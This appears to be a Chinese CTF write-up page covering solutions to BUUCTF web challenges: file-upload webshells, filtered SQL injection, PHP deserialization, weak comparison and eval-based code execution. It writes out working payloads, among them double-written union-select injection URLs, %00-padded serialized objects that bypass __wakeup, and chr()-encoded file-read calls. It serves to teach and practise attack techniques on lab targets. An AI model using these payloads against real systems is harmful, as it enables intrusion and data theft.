---
description: 记录蛤
---

# 💔 刷题wp

（1）\[极客大挑战 2019]Upload 1

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

其实很明显的就知道考的是文件上传漏洞，

先交了个空的后缀名为jpg的文件，发现他其实能识别出来图片。

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

所以我先直接放一张图片。后面发现jpg和png都不行，都是说

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

发现可能是我的思路不对。我决定直接抓个包看看。

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

看看前端能不能直接绕过。

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

被识别出来了是php。然后用了畸形的php2，php3，php4，php5，pht，全部都被ban了

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

然后我们用phtml时，结果是成功的。并且还提示了，我的文件包括了\<?。

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

所以我们可能代码厘米不能含有\<?，所以我们需要用其他的变形方式来替代了。就是用js标签的方式

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

发现还是检测出来不是图片了，我们可能是需要添加文件头来绕过他的判断。所以添加文件头需要转化为ascii码GIF&'=

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

可以看到上传成功了。然后我们查看upload/1.phtml看看是否上传成功

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

成功了，我们再输入我们需要的指令。其实这个在我查看路径的过程中我发现了这个的麻烦之处，就是他的flag的存放路径有点难找，所以这里我是用的antsword（蚁剑）

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

***

## （2）\[ACTF2020 新生赛]Upload 1

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

点击那个灯泡就有了文件上传，应该还是文件上传漏洞。随便上传一张图片。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们可以发现上传的文件的路径是在/uplo4d/下面。我们还是尝试抓包。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后改包上传我们的木马语句，然后发现识别出来是bad file，我们在文件前面加图片头试试。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

发现加了文件头还是失败，后面我们修改了文件后缀，我们直接用的phtml，不知道为什么也就他可以，然后结果就发现出来了。上传成功了。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后去到那个文件下面，发现成功了。

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

直接连接antsword了，毕竟这上面的题目的路径都很复杂。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## (3)\[极客大挑战 2019]BabySQL 1

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

感觉这个应该有一些过滤或者什么的。随便试试一个闭合

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后发现or没了，所以怀疑一些关键词or and这种都被过滤了。后面还发现，order by因为前面有or，也被过滤了啦，太离谱了有点。后面发现union，select这种全部被过滤了。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

对于过滤的方式，我们采用双写的方式绕过这个过滤。然后联合查询看看到底有几列。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实这种一般也就3，4列，结果3刚好就试出来了。并且他的回显我们看到，他是hello后面显示第二列的，密码显示第三列的，其实第二和第三都有回显，那么我们可以在这里做一些文章了。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

首先查询数据库名了。

```url
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,database(),3+%23
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

好好数据库名为geek，查看表名，这里有个坑就是or被过滤了，需要双写，你说好不好玩。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(table_name),3+frfromom infoorrmation_schema.tables whwhereere table_schema='geek'+%23
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里有两张表，b4bsql,geekuser。我猜是这个geekuser有信息哦。查查列名吧。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(column_name),3+frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'+%23
```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

很明显，是这个，三个列，username，id，password，三个。直接看吧。password别忘了双写，真的荒谬。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(passwoorrd),3+frfromom geek.geekuser+%23
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

阿哲，其实这个时候竟然不是，我人傻了，难道是错了一个表应该。是另外一个表。我服了。

```
http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin' uniunionon selselectect 1,group_concat(passwoorrd),3 frfromom geek.b4bsql %23
```

果然flag在这里。

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Syclover @ cl4y

Login Success!

Hello i\_want\_to\_play\_2077,sql\_injection\_is\_so\_fun,do\_you\_know\_pornhub,github\_is\_different\_from\_pornhub,you\_found\_flag\_so\_stop,i\_told\_you\_to\_stop,hack\_by\_cl4y,flag{7a63c8bc-9eef-43cd-9b56-bce0ecce2961}！

Your password is '3'

***

## （4）\[极客大挑战 2019]PHP 1

<figure><img src="../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实它提示了，我需要去查看他的备份的php文件，但是这个知识点我之前没有涉猎过，所以我会补充一下这个知识点。扫描目录这个时候需要用到工具。我也不知道，其实之前老师讲过，但是没有太记下来我真服了。

在后面的web常用工具介绍了，可以看看。 [#id-1.dirsearch](../gong-ju-jie-shao/web-chang-yong-gong-ju.md#id-1.dirsearch "mention")

然后我们扫描这个目录。

```
dirsearch -u http://430242be-4302-48a1-9751-df8ccc88bec4.node5.buuoj.cn:81/ -e php
```

然后因为实在是太多了，光是php就有8000多，所以我们直接看wp说有www.zip这个文件，其实感觉有点难判断怎么是www.zip文件的。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到这个里面有一个flag.php文件

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

打开发现里面好像不是我们要找的flag。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里还有一个class.php,然后打开发现是类之类的，猜测是反序列化漏洞。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

还要配合index.php里面确定是反序列化漏洞

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实很明显就是如果要显示flag的话是要求username为admin，password为100的，并且\_\_wakeup（）函数不能执行，因为在反序列化的时候会执行这个函数，如果要绕过wakeup的话，我们需要属性数变大就能绕过这个函数。然后我们写一个php脚本来序列化我们的结果。

```php

<?php

class Name{
    private $username='admin';
    private $password=100;

}

$a=new Name();
echo serialize($a);

```

得到的结果是

```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

又因为要绕过，把对象2改成3就可以了。

```
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```

利用select参数传过去。这个select参数我们可以从index.php的文件里面看到这个参数

这里需要注意一点是我之前总结了笔记但是没有彻底理解的地方，我们用的是private模式，所以其实我们可以看到他显示的是14个·大小，因为前面和后面都有%00，然后我们在从网页上复制粘贴下来的时候是没有的，所以我们需要人为的添加这个%00，所以最后我们得到的应该是

```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

这样才能得到flag。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （5）\[ACTF2020 新生赛]BackupFile 1



<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

其实他的提示也是找到源文件。

刚刚用过一个dirsearch，这一次也来试试。

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

有index.php.bak，这个备份文件，我们在常用后缀里面有介绍过它的存在。

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

查看这个文件发现

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

感觉这个考的是php特性的弱比较，所以我们直接传入$key是个数字并且为123就可以了。

得到flag。

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （6）\[RoarCTF 2019]Easy Calc 1

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

就是一个简单的计算器，不知道随便试试，不知道考啥现在还。

查看源码发现写了一句设置了waf去确保安全

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

发现有一个calc.php进行计算的，我们去查看这个文件。直接看到源码了，也发现了过滤规则

<figure><img src="../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里有一个函数eval（）代码执行函数，这个主要是考察RCE漏洞啊，但是他过滤了很多单引号，双引号，dollar之类的全部过滤了，只有用无参数的读取文件了。这里可以参考 [#id-6.-wu-can-shu-du-qu](../rce-yuan-cheng-dai-ma-zhi-hang/代码执行知识点总结.md#id-6.-wu-can-shu-du-qu "mention")

并且这里calc计算机不允许传入字母，因为会出现识别不了的情况，所以我们这个地方补充了怎么绕过这个waf的方法。 [#id-2.-chuan-can-bu-yun-xu-han-you-zi-mu](buuctf-bu-chong-zhi-shi-dian.md#id-2.-chuan-can-bu-yun-xu-han-you-zi-mu "mention")

所以我们输入以下的，是查看当前目录下面的目录有哪些。

```
http://node5.buuoj.cn:29062/calc.php? num=var_dump(scandir(chr(46)))
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后查看根目录下面的文件有哪些。

```
http://node5.buuoj.cn:29062/calc.php? num=print_r(scandir(chr(47)))
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

看到有一个flagg，我们应该就是要进入这个目录下面去查看。我发现这个时候用chr和.是最好用的。其实后面尝试后发现这个不是一个目录，是一个文件。

```
http://node5.buuoj.cn:29062/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （7）\[BJDCTF2020]Easy MD5

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这个知识点之前在总结的时候并没有好好总结完，所以这里补充了md5（）函数的绕过的知识点，这个知识点好像是在sql注入里面的。我们补充了这个知识点在sql注入里面。

并且这个触发点也不是在我们平常看到的地方，是在响应头里面。

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

我们可以看到在里面有一个hint，并且是md5（password，true）绕过，所以我们向pass输入ffifdyop

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后跳转到另外一个php文件

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

查看源码我们可以发现他的php代码

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

很明显这是我们php特性里面的==弱比较和md5（）的特性。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们传入里面的随便两个就可以。

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

传入之后跳转到另外一个php文件了，需要post传入的结果不相等，但是md5得完全相等，我们可以通过传入两个数组去绕过。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （8）\[极客大挑战 2019]BuyFlag 1

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

刚打开真的不知道要干嘛，然后看到有一个payflag网页，进入然后说得要是cuit的学生，并且要回答正确的密码。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

查看源码发现有php代码

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

利用的是php弱比较

然后输入以404开头的字符串，比如404abc之类的。这完成了第二个要求，还有一个，判断你是cuit的成员，我们抓个包尝试一下。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

发现cookie上面有个user=0，应该是user=1就是认为你是cuit的成员。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后出现了另外的要求，需要很多钱

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

所以我们post传入money和password，并且把user改为1就成了应该。

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

但是他显示我的钱的数字位数太长了，那我们得换一种表示方式用科学计数法绕过，1后面9个零表示1e9

得到flag。

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （9）\[HCTF 2018]admin 1

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

看不出什么，查看一下源码

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

提示我了，我不是admin，然后我们注册登录之类的。提示说admin被人注册了，就说明，我们要用admin的账号登录，那么我们知道username=admin，就要知道密码。

应该是弱密码，我随便输入了一个123，就出来了flag，甚至都不需要我爆破，我是欧皇。

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （10）\[MRCTF2020]你传你🐎呢 1

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

应该是个文件上传漏洞。要传一句话木马大概是。

上传了一个一个话木马的jpg文件发现上传成功了。

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们抓个包。

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后发现上传失败了。

<figure><img src="../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

后面看到是要上传.htaccess文件，其实在这个时候感觉上传这种文件不知道是怎么判断出来的，但是他既然是这样那我们就传.htaccess文件吧。那我们就写一个让他把png文件可以当错php代码来执行的.htaccess文件

<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们传一个一句话木马

<figure><img src="../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后用as去连接

<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到flag。

<figure><img src="../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （11）\[护网杯 2018]easy\_tornado 1（未写）

<figure><img src="../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

拿到之后就看了flag.txt文件，然后看了

<figure><img src="../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

结果进去那个目录是个404，还是自己写的，然后就知道肯定不对。然后就看了hints.txt，说要cookie\_secret，就是cookie有点什么？然后filename还进行了md5加密

<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

确实看到后面有一个filehash

<figure><img src="../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

然后welcome里面有一个render不知道这是啥搜搜吧。还有那个tornado完全不知道是个jier

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

不会写之后再写太难了。这个知识点晚点再学。

***

## （12）\[ZJCTF 2019]NiZhuanSiWei 1

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

后面是反序列化漏洞是肯定的，前面应该要先把这个文件给读出来。

首先是text，text是个文件，但是我们目前不知道文件的目录，就需要用到php伪协议data://可以被当做文件，并且后面能带php代码。

我们可以通过这个代码去查看文件了。后面又要用file去读取文件，但是又不能出现flag，就需要用filter伪协议来个base64加密。

这个地方建议重新温习一下我们之前讲过的RCE漏洞里面的php伪协议部分。 [#id-2-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi](../rce-yuan-cheng-dai-ma-zhi-hang/代码执行知识点总结.md#id-2-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi "mention")

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

然后我们就得到了useless.php，我们转换一下看看代码是什么

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

没有什么特别不一样的，直接将file传参为flag.php就可以，然后我们直接写一个脚本

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

查看源码得到flag。

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

***

## （13）\[极客大挑战 2019]HardSQL 1

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

还是sql注入，然后发现我输入注入语句被发现了。所以应该是被过滤了。我决定fuzz一下看看有哪些被过滤了。

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

这里一共就两种返回结果，一种是别被我抓到了臭弟弟，被过滤了，另外一种就是wrong password啥的，就是没被过滤，但是不对。后来发现是我的fuzz字典不好用。

在后面放一个fuzz字典吧，在常用字典里 [#id-1.sqlfuzz-zi-dian](../gong-ju-jie-shao/chang-yong-zi-dian.md#id-1.sqlfuzz-zi-dian "mention")

可以看到报错注入的函数没有被过滤，xpath报错还能用，那我们就用他们来进行报错注入。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们首先爆库名发现是geek

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后爆表名，这里需要注意，空格用（）绕过，=用like绕过。

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后爆列名，得到id，username，password，我们当然去看password

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

查看发现password并不完整，也就是说，还有没有显示出来的。我们从右边开始看看

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后拼起来

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到flag。

***

## （14）\[MRCTF2020]Ez\_bypass 1

<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

其实感觉这个就是看这个代码flag.php里面的，并且他没有格式，贼难看。自己先把格式弄弄。

<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

首先get传入id和gg，用数组绕过，然后post传入passwd，用字符串弱比较来绕过。

<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

得到flag。

***

## （15）\[网鼎杯 2020 青龙组]AreUSerialz

<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

又是代码，应该是反序列化漏洞，因为看到了类和一些魔术方法。这个代码审计对我来说，有点复杂了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊，我真是醉了。

后面看的差不多了，但是这个ord函数我不太了解，我用手册查查看

<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后又查了ascii码表

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这里也粘贴一下p神对这个的理解

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

并且自己也对他进行理解了。并且写这个题对pop链也理解了，就把反序列化的知识点都总结了一下。

所以最后得到flag，也就轻轻松松了。

```php
<?php
class FileHandler{
     public $op=2;
     public $filename='flag.php';
     public $content='1';
}
$a=new FileHandler();
echo serialize($a);
?>
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

最后得到flag。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## （16）\[GXYCTF2019]BabyUpload 1

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

上传png和jpg都显示上传太露骨了，感觉是前端把一些后缀名过滤了。直接抓包了。上传.htaccss文件了。让他能把php代码执行了。

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后上传php代码了，发现他好像能识别一些php的特征，这里猜测是因为\<?这个符号，我们用\<script>标签来代替吧。

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后用蚁剑连接。

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到flag。

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***



## （17）\[SUCTF 2019]CheckIn 1

<figure><img src="../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

又是文件上传，我上传了一张图片可能含有\<?，他直接说

<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

这里直接就是抓包，本来想上传.htaccess文件，结果被ban了，只能是image，好好好。

<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

php的后缀也被ban了很多

<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

后来实在想不到了，看了一下wp用的是user.ini文件，这个我们也讲过知识点，这里重温一下就行。把连接放在这，忘记的小伙伴可以去看看。 [#id-6-hou-duan-jian-yan-zhi-user.ini-wen-jian-pei-zhi](../wen-jian-shang-chuan-lou-dong/wen-jian-shang-chuan-lou-dong-zhi-shi-dian-zong-jie-bao-han-le-wen-jian-jie-xi-lou-dong.md#id-6-hou-duan-jian-yan-zhi-user.ini-wen-jian-pei-zhi "mention")

并且在这里要加上文件头

<figure><img src="../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

然后上传1.jpg文件

<figure><img src="../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

jpg文件连接不了as，只能自己徒手传参。

<figure><img src="../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

***

## （18）\[GXYCTF2019]BabySQli 1

<figure><img src="../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

直接出来密码错误，说明密码这个地方可以进行sql注入。抓包试一下吧，因为这个看不到自己写的，乌漆嘛黑的

<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

发现右边有提示

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

先进行base32解密

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

再进行base64解密

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

真是醉了，这说明username才是我们要sql注入的位置。然后判断列名，发现是3行

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

想要用database（）的时候直接显示hack me，说明database（）被ban了

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

后面发现很多函数都被ban了，但是他的提示是注入username，可是我用admin去测试的时候现实的wrong pass，说明admin一定存在，并且他是先检验username，再检验password。并且我们的usernmae放到第二列的时候发现admin是显示的wrong pass，但是其他的列显示的就是wrong user，说明username列是在第二列。

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

这里竟然还要猜后台逻辑/(ㄒoㄒ)/\~\~，其实我看了他们的猜测之后，我觉得一些基本的能知道，但是md5是应该是因为mysql里面的密码一般是md5加密了。感觉是这个原因。这个有个小知识点就是联合语句查询不存在的数据的时候就能自动生成一个结果。所以我们可以用这个去虚拟构造一个admin的密码，就可以通过这个密码通过。这里用一个e10adc3949ba59abbe56e057f20f883e，密码就是123456，后面的pw的也要改成123456。

<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

***

## （19）\[GYCTF2020]Blacklist 1



<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

数据库有很多被ban了我猜，我先试几个，然后fuzz看看。其实发现好像都没怎么被ban啊，万能密码还是能用

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

fuzz之后发现输入select之类的时候，就把ban了的看到了，所以select，update，where就不能能用了。

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

用堆叠注入发现数据库有以下这些。

<figure><img src="../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

